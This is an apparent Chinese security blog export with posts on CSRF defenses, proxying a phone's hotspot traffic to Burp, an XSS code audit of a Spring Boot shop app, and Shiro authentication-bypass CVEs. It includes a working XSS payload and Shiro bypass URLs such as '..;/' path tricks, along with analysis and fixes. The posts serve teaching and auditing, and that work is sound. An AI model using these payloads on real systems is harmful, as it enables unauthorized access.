HttpServletResponse response, Object handler, </span></span></span><br><span class="line"><span class="function"><span class="params">	ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//检查返回中是否存在"set-cookie"，若存在，则给其加上"SameSite"属性</span></span><br><span class="line">		Collection&lt;String&gt; headers = response.getHeaders(HttpHeaders.SET_COOKIE);</span><br><span class="line">		<span class="keyword">boolean</span> firstHeader = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">for</span> (String header : headers) &#123; <span class="comment">// 可能存在多个"Set-Cookie"属性，故采用for循环</span></span><br><span class="line">			<span class="keyword">if</span> (firstHeader) &#123;</span><br><span class="line">				response.setHeader(HttpHeaders.SET_COOKIE, String.format(<span class="string">"%s; %s"</span>,  header, <span class="string">"SameSite=strict"</span>)); <span class="comment">//可根据业务设置strict或者lax</span></span><br><span class="line">				firstHeader = <span class="keyword">false</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		response.addHeader(HttpHeaders.SET_COOKIE, String.format(<span class="string">"%s; %s"</span>,  header, <span class="string">"SameSite=strict"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, </span></span></span><br><span class="line"><span class="function"><span class="params">	Object handler, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="设置CSRF-token"><a href="#设置CSRF-token" class="headerlink" title="设置CSRF token"></a>设置CSRF token</h2><p>CSRF token生成可以借助Spring Security框架，默认提供CSRF防护。Spring Security的CSRF防护是基于Filter来实现的，Spring Security提供多种保存token的策略，既可以保存在cookie中，也可以保存在session中，保存方法可以手动指定。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">	request.setAttribute(HttpServletResponse<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">response</span>)</span>;</span><br><span class="line">	<span class="comment">// 通过tokenRepository从request中获取csrf token</span></span><br><span class="line">	CsrfToken csrfToken = <span class="keyword">this</span>.tokenRepository.loadToken(request);</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">boolean</span> missingToken = csrfToken == <span class="keyword">null</span>;</span><br><span class="line">	<span class="comment">// 如果未获取到token则新生成token并保存</span></span><br><span class="line">	<span class="keyword">if</span> (missingToken) &#123;</span><br><span class="line">		csrfToken = <span class="keyword">this</span>.tokenRepository.generateToken(request);</span><br><span class="line">		<span class="keyword">this</span>.tokenRepository.saveToken(csrfToken, request, response);</span><br><span class="line">	&#125;</span><br><span class="line">	request.setAttribute(CsrfToken<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">csrfToken</span>)</span>;</span><br><span class="line">	request.setAttribute(csrfToken.getParameterName(), csrfToken);</span><br><span class="line">	<span class="comment">// 判断是否需要进行csrf token校验</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">this</span>.requireCsrfProtectionMatcher.matches(request)) &#123;</span><br><span class="line">		filterChain.doFilter(request, response);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取前端传过来的实际token</span></span><br><span class="line">	String actualToken = request.getHeader(csrfToken.getHeaderName());</span><br><span class="line">	<span class="keyword">if</span> (actualToken == <span class="keyword">null</span>) &#123;</span><br><span class="line">		actualToken = request.getParameter(csrfToken.getParameterName());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 校验两个token是否相等</span></span><br><span class="line">	<span class="keyword">if</span> (!csrfToken.getToken().equals(actualToken)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.debug(<span class="string">"Invalid CSRF token found for "</span></span><br><span class="line">				+ UrlUtils.buildFullRequestUrl(request));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 如果是token缺失导致，则抛出MissingCsrfTokenException异常</span></span><br><span class="line">		<span class="keyword">if</span> (missingToken) &#123;</span><br><span class="line">			<span class="keyword">this</span>.accessDeniedHandler.handle(request, response,</span><br><span class="line">				<span class="keyword">new</span> MissingCsrfTokenException(actualToken));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 如果不是同一个token则抛出InvalidCsrfTokenException异常</span></span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.accessDeniedHandler.handle(request, response,</span><br><span class="line">			<span class="keyword">new</span> InvalidCsrfTokenException(csrfToken, actualToken));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 执行下一个过滤器</span></span><br><span class="line">	filterChain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注意，不管是校验Referer还是设置SameSite，都不能防止同站发起的CSRF，比如本文所举的例子就没法防范。XSS也可能从页面中获取CSRF token再进行攻击，这些防范方法都是提高攻击者的攻击难度，而不是完全消灭CSRF。真正重要的功能一定需要短信验证码或者密码之类的仅当前用户知道的参数才能进行操作，比如支付转账等。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf-protection" target="_blank" rel="noopener">https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf-protection</a></p>
<p><a href="https://blog.csdn.net/junmoxi/article/details/89208311" target="_blank" rel="noopener">https://blog.csdn.net/junmoxi/article/details/89208311</a></p>
<p><a href="https://www.cnblogs.com/volcano-liu/p/11301057.html" target="_blank" rel="noopener">https://www.cnblogs.com/volcano-liu/p/11301057.html</a></p>
<p><a href="https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133" target="_blank" rel="noopener">https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133</a></p>
]]></content>
  </entry>
  <entry>
    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
<a id="more"></a>

<p>使用步骤：</p>
<ol>
<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
</ol>
<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">

<ol start="3">
<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
</li>
<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
</ol>
<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">



<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
<p><code>sudo pfctl -d</code>关闭packet filter</p>
<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
]]></content>
  </entry>
  <entry>
    <title>Java SpringBoot框架代码审计四 - XSS</title>
    <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
    <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
<a id="more"></a>

<h1 id="XSS代码审计过程"><a href="#XSS代码审计过程" class="headerlink" title="XSS代码审计过程"></a>XSS代码审计过程</h1><p>我们先从开发者的视角来看，假设一个系统有100个可输入字符的功能点，现在我需要做XSS防护，那么我是不是要在这100个功能点前都做一遍XSS字符过滤呢？都做一遍的话开发可能得累死，而且每个功能点还需要重新进行测试，整个过程下来消耗大量的人力。</p>
<p>就算一个一个功能点加完字符过滤，那以后项目有新需求，重新添加功能怎么办呢？又给每个功能添加XSS字符过滤？那别的工作还要不要做了。</p>
<p>所以XSS修复并不是单独进行的，往往是通过Filter或者Interceptor来全局处理。Filter或Interceptor在请求进入Controller前，对请求内容进行处理。这样可以做到统一的字符处理，不用在每个功能点前单独对用户传入的字符进行XSS过滤。</p>
<p>在代码审计中，找XSS漏洞第一件事是先判断程序中是否存在Filter或者Interceptor。</p>
<p>一个理想的XSS流程处理的简略图如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/payload-request-path.png" alt="payload-request-path" style="zoom:50%;">



<p>回到项目结构中来，我们发现其中没有配置任何filter，只有interceptor（拦截器）。Filter和interceptor做的事很相似，但他们的触发时机不同，且interceptor只在Spring中生效，具体差别可以搜索引擎中搜索查看。</p>
<p>在项目代码中查找发现不存在filter，只有三个interceptor，分别是：<code>AdminLoginInterceptor</code>、<code>NewBeeMallCartNumberInterceptor</code>、<code>NewBeeMallLoginInterceptor</code>。从文件名来判断就知道不存在XSS相关的拦截器。</p>
<p>可以判断该应用程序中很可能存在XSS。</p>
<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/do-not-exist-filter.png" alt="do-not-exist-filter" style="zoom:33%;">



<p>我们先来实际测试一下XSS，在首页搜索框中输入XSS payload <code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try.png" alt="xss-first-try"></p>
<p>查看返回结果，咦奇怪，怎么XSS payload没有触发呢？</p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try-response.png" alt="xss-first-try-response"></p>
<p>抓包看一下，确定是XSS payload中的<code>&quot;&lt;&gt;</code>被转义了</p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-first-try.png" alt="burp-xss-first-try"></p>
<p>我们下断点调试看一下，传进来的keyword确实是<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，传入Web系统的过程中没有转义处理，那问题出在哪里呢？</p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/debug-xss-first-try.png" alt="debug-xss-first-try"></p>
<p>其实转义出现在输出到模版的过程中，系统使用了thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
<p><code>/src/main/resources/templates/mall/search.html:33</code></p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/thymeleaf-transfer.png" alt="thymeleaf-transfer"></p>
<p>此时XSS payload传递路径如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-request-path.png" alt="xss-request-path" style="zoom:50%;">

<p>弄明白XSS payload被转义的原理之后，我们可以转换思路：</p>
<ol>
<li>找thymeleaf未作转义的输出，<code>th:utext</code>不会将字符转义</li>
</ol>
<p>发现以下模版中存在<code>th:utext</code>，所以这两个功能点存在XSS。其中第二个，<code>detail.html</code>因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用<code>th:utext</code>来显示商品详细。</p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/search-not-transferred.png" alt="search-not-transferred"></p>
<ol start="2">
<li>找不经过thymeleaf的输出</li>
</ol>
<p>在后台，商品信息编辑中输入XSS payload，点击保存</p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/not-through-thymeleaf.png" alt="not-through-thymeleaf"></p>
<p>发现触发我们输入的XSS payload</p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-exploit.png" alt="xss-exploit"></p>
<p>我们可以抓包看一下，商品信息使用jqGrid传输，将返回的json显示到网页中，该过程没有对字符串进行转义，导致XSS漏洞产生。</p>
<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-second-try.png" alt="burp-xss-second-try"></p>
<p>除以上举例之外，系统还存在多处XSS，在此就不一一列举，大家有兴趣的话可以自己试着找找。 </p>
<h1 id="XSS-修复"><a href="#XSS-修复" class="headerlink" title="XSS 修复"></a>XSS 修复</h1><p>预防存储型和反射型XSS的代码有两种常见方法：</p>
<ol>
<li>对HTML做充分转义</li>
</ol>
<p>转义一般在filter或interceptor中做，如何添加xss filter网上有很多资料可以参考，比如 <a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a> ，就不在此赘述。</p>
<p>XSS难以消灭其中一个因素是功能需求与转义相背，比如filter转义把json中的双引号转义导致json无法解析；富文本编辑器就不能转义正常用户所需的html标签，需要额外对允许输入的标签做一个白名单过滤；大于小于号的比较，输入<code>1&lt;2</code>，转义就变成了<code>1 &amp;lt; 2</code>导致功能失效等。</p>
<p>修复过程中得结合考虑实际的业务场景。</p>
<ol start="2">
<li>改成纯前端渲染，避免直接输出html字符，把代码和数据完全分隔开，但是又需要注意DOM XSS的问题。</li>
</ol>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>除了存储型和反射型XSS，还有DOM型XSS，因为它属于前端JavaScript的范畴，和后端Java代码没有关系，所以我没在本文中提及。</p>
<p>HttpOnly属性：SpringBoot默认为会话cookie开启httponly，审计时检查是否存在<code>server.servlet.session.cookie.http-only</code>属性，如果存在的话检查其是否被改为false</p>
<p>CSP：在响应头中添加<code>X-Content-Security-Policy</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSecurityConfig</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">	<span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		http</span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">			.headers()</span><br><span class="line">				.addHeaderWriter(<span class="keyword">new</span> StaticHeadersWriter(<span class="string">"X-Content-Security-Policy"</span>,<span class="string">"script-src 'self'"</span>))</span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
<p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
<p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
<p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
]]></content>
  </entry>
  <entry>
    <title>Shiro权限验证绕过史</title>
    <url>/2020/08/20/Shiro_Authentication_Bypass/</url>
    <content><![CDATA[<p>今年以来，shiro连续曝出多个身份验证绕过漏洞，在此梳理一下shiro身份验证绕过漏洞史。</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/shiro-security-reports.png" alt="shiro-security-reports"></p>
<a id="more"></a>

<p>来自<a href="https://shiro.apache.org/security-reports.html" target="_blank" rel="noopener">shiro安全通告</a> </p>
<h1 id="SHIRO介绍"><a href="#SHIRO介绍" class="headerlink" title="SHIRO介绍"></a>SHIRO介绍</h1><p>很多人认识Shiro是因为其反序列化漏洞的广泛性和严重性。Shiro本身是一个常用的Java安全框架，用于执行身份验证、授权、密码和会话管理功能，有着易用、全面、灵活等特性，shiro被广泛使用。通常Shiro会和Spring等框架一起搭配用于Web应用系统的开发。</p>
<p>因为其本身就用于身份验证和权限控制，出现身份验证绕过的问题是比较严重的，CVSS给的评分就比较高</p>
<blockquote>
<p>CVE-2020-1957 CVSS 3.x 评分 9.8，CVSS 2.0评分 7.5</p>
<p>CVE-2020-11989 CVSS 3.x 评分 9.8，CVSS 2.0评分 7.5</p>
<p>CVE-2020-13933 CVSS 目前还未评分，后续补上</p>
</blockquote>
<p>Shiro是基于URI的权限认证，配置的url模式使用Ant风格模式。Ant路径通过通配符支持“?”、“*”、“**”。</p>
<p>对于“?”，其匹配一个字符串。如“/admin?”将匹配“admin1”，但不匹配“/admin”或“/admin/”。</p>
<p>对于“*”，其匹配零个或多个字符串。如“/admin/*”将匹配“/admin/”、“/admin/abc”，但不匹配“/admin/a/b”。</p>
<p>对于“**”，其匹配路径中的零个或多个路径。如“/admin/**”将匹配“/admin/a”或“/admin/a/b”。</p>
<br>

<p>常用的拦截器配置：</p>
<p>anon(anonymous)拦截器表示匿名访问(既不需要登录即可访问)。</p>
<p>authc(authentication)拦截器表示需要身份认证过后才能访问。</p>
<p>拦截器的匹配顺序采取第一次匹配优先的方式，即从头开始使用第一个匹配的url模式对应的拦截器链。</p>
<br>

<p>例如在配置中存在如下配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="string">"/doLogin"</span>, <span class="string">"anon"</span>);</span><br><span class="line">map.put(<span class="string">"/admin/*"</span>, <span class="string">"authc"</span>);</span><br><span class="line">map.put(<span class="string">"/manage/*"</span>, <span class="string">"authc"</span>);</span><br></pre></td></tr></table></figure>

<p><code>/doLogin</code>可以直接被访问，而<code>/admin/*</code>和<code>/manage/*</code>需要进行身份认证。</p>
<h1 id="SHIRO搭建"><a href="#SHIRO搭建" class="headerlink" title="SHIRO搭建"></a>SHIRO搭建</h1><p>测试Demo：<a href="https://github.com/s31k31/shiro-simple-example" target="_blank" rel="noopener">https://github.com/s31k31/shiro-simple-example</a> </p>
<p>导入IDE，等待maven配置加载完成，点击运行/调试即可启动。</p>
<p>需测试不同版本的shiro时，在pom.xml文件中修改shiro版本即可。</p>
<p><code>src/main/resources/application.properties</code>中配置的端口为8011，<code>context path</code>为<code>/shiro</code>，有需要可以自行更改。</p>
<h1 id="SHIRO-682"><a href="#SHIRO-682" class="headerlink" title="SHIRO-682"></a>SHIRO-682</h1><p><a href="https://issues.apache.org/jira/browse/SHIRO-682" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-682</a> </p>
<p>在2019年3月，中国开发者<a href="https://github.com/tomsun28" target="_blank" rel="noopener">tomsun08</a>在shiro项目中提出<a href="https://github.com/apache/shiro/pull/127" target="_blank" rel="noopener">PR</a></p>
<blockquote>
<p>在Spring web中<code>/resource/menus</code>和 <code>resource/menus/</code>都能访问到同一资源。</p>
<p>而shiro中的<code>pathPattern</code>只能匹配<code>/resource/menus</code>，而不能匹配 <code>/resource/menus/</code>。</p>
<p>用户使用<code>requestURI + &quot;/&quot;</code>就能绕过权限控制。</p>
</blockquote>
<p>但直到2019年11月，在shiro 1.5.0中修复这一问题。修改的代码在<a href="https://github.com/apache/shiro/pull/127/commits/e61a29cd6ad4724cf9d85c463103c01f6bafdc44" target="_blank" rel="noopener">commit</a></p>
<p>tomsum08不是专门的安全研究人员，所以当时仅对URI最后的<code>/</code>做了处理。若URI最后为<code>/</code>，则去掉该<code>/</code>。</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/code-compare-pathmatchingfilterchainresolver.png" alt="code-compare-pathmatchingfilterchainresolver"></p>
<p>这处改动的并非真正漏洞核心，漏洞本质是Spring处理URI和Shiro处理URI不一致导致的。</p>
<p>Spring处理URI和Shiro处理URI不一致性才是导致后续多个漏洞曝出的真正原因。</p>
<br>

<h1 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h1><p>漏洞存在于1.5.2版本之前，复现时将<code>pom.xml</code>中的shiro版本设置为1.5.2版本之前，如下设置为1.5.1</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问：<a href="http://localhost:8011/shiro/admin/page" target="_blank" rel="noopener">http://localhost:8011/shiro/admin/page</a> ，此时跳转登录页面</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request-normal.png" alt="burp-request-normal"></p>
<br>

<p>访问：<a href="http://localhost:8011/shiro/xxxx/..;/admin/page" target="_blank" rel="noopener">http://localhost:8011/shiro/xxxx/..;/admin/page</a> ，成功绕过身份校验</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request-bypass.png" alt="burp-request-bypass"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>shiro配置规则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="string">"/doLogin"</span>, <span class="string">"anon"</span>);</span><br><span class="line">map.put(<span class="string">"/admin/*"</span>, <span class="string">"authc"</span>);</span><br><span class="line">map.put(<span class="string">"/manage/**"</span>, <span class="string">"authc"</span>);</span><br></pre></td></tr></table></figure>

<br>

<p><code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>是shiro判断输入的URI是否匹配拦截器的函数。匹配成功将返回相应的拦截器，进行对应的权限操作。</p>
<p>当我们传入<code>/shiro/admin/page</code>时（<code>/shiro</code>在此属于context path，不会被当作URI），会匹配到<code>/admin/*</code>这条规则，从而进行authc，也就是到<code>org/apache/shiro/web/filter/authc/AuthenticatingFilter.java</code>中去判断权限。</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/debug-getchain-pathpattern.png" alt="debug-getchain-pathpattern"></p>
<br>

<p>但当我们传入<code>/shiro/xxxx/..;/admin/page</code>时，shiro获取到的URI是<code>/xxxx/..</code>，注意这里shiro移除了<code>;</code>后面的内容。</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/debug-getchain-requesturi.png" alt="debug-getchain-requesturi"></p>
<br>

<p>我们跟进<code>getPathWithinApplication()</code>中进一步查看，最终调用的是<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code>，可以看到<code>requestUri</code>是通过<code>getRequestUri()</code>方法获取得到的</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/debug-getpathwithinapplication.png" alt="debug-getpathwithinapplication"></p>
<p><code>getRequestUri()</code>代码如下，根据<code>request.getRequestURI()</code>获取的uri，传入<code>decodeAndCleanUriString()</code>方法。关于<code>request.getRequestURI</code>带来的安全问题可查看<a href="https://joychou.org/web/security-of-getRequestURI.html" target="_blank" rel="noopener">这篇文章</a>。</p>
<p><code>decodeAndCleanUriString()</code>方法对<code>;</code>后面的内容进行删除，只获取<code>;</code>前的内容。所以我们传入的<code>/xxxx/..;/admin/page</code>，在shiro中得到的只是<code>/xxxx/..</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getRequestUri</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">	String uri = (String) request.getAttribute(INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">	<span class="keyword">if</span> (uri == <span class="keyword">null</span>) &#123;</span><br><span class="line">		uri = request.getRequestURI();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> normalize(decodeAndCleanUriString(request, uri));</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> </span>&#123;</span><br><span class="line">	uri = decodeRequestString(request, uri);</span><br><span class="line">	<span class="keyword">int</span> semicolonIndex = uri.indexOf(<span class="string">';'</span>);</span><br><span class="line">	<span class="keyword">return</span> (semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>/xxxx/..</code>没有匹配到shiro配置中的规则，默认放行。</p>
<p>但在spring web处理<code>/shiro/xxxx/..;/admin/page</code>时，Spring对<code>..;/</code>是包容的，会被当成<code>../</code>处理，所以最后访问的是<code>/shiro/admin/page</code>。</p>
<p>当然<code>/shiro/xxxx;/../admin/page</code>同样能绕过身份验证</p>
<p>这就是由于shiro和spring对URL处理的不一致导致的第一个漏洞，后续的CVE-2020-11989和CVE-2020-13933属于同一类问题。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复代码在此<a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081a" target="_blank" rel="noopener">commit</a>，将<code>request.getRequestURI()</code>改成了<code>request.getContextPath()+&quot;/&quot;+request.getServletPath()+request.getPathInfo()</code></p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/code-compare-webutils.png" alt="code-compare-webutils"></p>
<br>

<p><code>getServletPath</code>得到的是实际Servlet路径，无法利用路径回溯<code>../</code>和分号<code>;</code>绕过。</p>
<p>在shiro1.5.2版本中，传入<code>/shiro/xxxx/..;/admin/page</code>，得到的结果是<code>/shiro//admin/page</code></p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/debug-getrequesturi.png" alt="debug-getrequesturi"></p>
<br>

<h1 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h1><p>该漏洞由淚笑向 Apache Shiro 官方报告的<a href="https://issues.apache.org/jira/browse/SHIRO-782?jql=project%20%3D%20SHIRO" target="_blank" rel="noopener">漏洞</a>。</p>
<p>漏洞存在于1.5.3版本之前，复现时将<code>pom.xml</code>中的shiro版本设置为1.5.2版本</p>
